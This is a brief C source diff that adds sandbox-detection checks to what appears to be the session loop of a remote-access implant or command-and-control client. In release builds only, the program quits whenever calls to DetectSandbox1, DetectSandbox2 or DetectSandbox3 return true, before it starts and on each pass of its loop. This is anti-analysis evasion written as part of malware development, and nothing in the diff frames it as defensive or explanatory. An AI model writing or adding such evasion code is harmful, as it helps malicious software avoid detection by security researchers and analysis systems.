@@ -217,6 +217,12 @@ VOID SessionMainLoop
 		goto CLEANUP;
 	}
 
+#ifndef _DEBUG
+	if (DetectSandbox2() || DetectSandbox3()) {
+		goto CLEANUP;
+	}
+#endif
+
 	if (!pSession->Start(pSession->pGlobalConfig, pSession->lpClient)) {
 		goto CLEANUP;
 	}
@@ -231,6 +237,12 @@ VOID SessionMainLoop
 	}
 
 	while (TRUE) {
+#ifndef _DEBUG
+		if (DetectSandbox1() || DetectSandbox2()) {
+			goto CLEANUP;
+		}
+#endif
+
 		if (dwNumberOfAttempts >= pSession->pGlobalConfig->dwMaxFailure) {
 			break;
 		}
